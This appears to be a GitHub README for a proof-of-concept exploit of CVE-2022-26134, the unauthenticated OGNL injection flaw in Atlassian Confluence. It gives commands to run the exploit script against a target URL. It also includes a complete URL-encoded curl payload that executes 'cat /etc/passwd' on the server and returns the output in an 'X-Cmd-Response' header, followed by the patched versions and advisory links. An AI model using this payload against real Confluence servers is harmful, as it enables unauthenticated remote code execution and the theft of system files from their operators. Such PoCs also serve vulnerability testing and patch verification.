# CVE-2022-26134

[PoC] Atlassian Confluence (CVE-2022-26134) - Unauthenticated OGNL injection vulnerability (RCE)

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/kh4sh3i](https://github.com/kh4sh3i) |
| Url      | [https://github.com/kh4sh3i/CVE-2022-26134](https://github.com/kh4sh3i/CVE-2022-26134)                                               |
| Stars    | 3                                                          |
| License  | Creative Commons Zero v1.0 Universal                                                        |

<details>

<summary>Topic / Tags</summary>

* atlassian* atlassian-jira* code* confluence* confluent-platform* cve* cve-2022-26134* jira* payload* poc* rce* remote

</details>

## Readme

### CVE-2022-26134 - OGNL injection vulnerability.

In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance.


### PoC:

```bash
git clone https://github.com/kh4sh3i/CVE-2022-26134
cd CVE-2022-26134
python3 cve-2022-26134.py https://target.com CMD
```


Example with CURL command:
```bash
curl --head -k "https://YOUR_TARGET.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20%2Fetc%2Fpasswd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D" 
```

Then, the result of the command will be reflected in the parameter `X-Cmd-Response` in the response header. 

### Fixed Versions
Released versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 and 7.18.1 contain a fix for this issue.


### Reffrence
* [confluence](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html)
* [jira](https://jira.atlassian.com/browse/CONFSERVER-79016)




## Get the content

```
git clone https://github.com/kh4sh3i/CVE-2022-26134
cd CVE-2022-26134
```

{% embed url="https://github.com/kh4sh3i/CVE-2022-26134" %}

<figure><img src="https://avatars.githubusercontent.com/u/64693844?v=4" alt=""><figcaption><p>kh4sh3i</p></figcaption></figure>
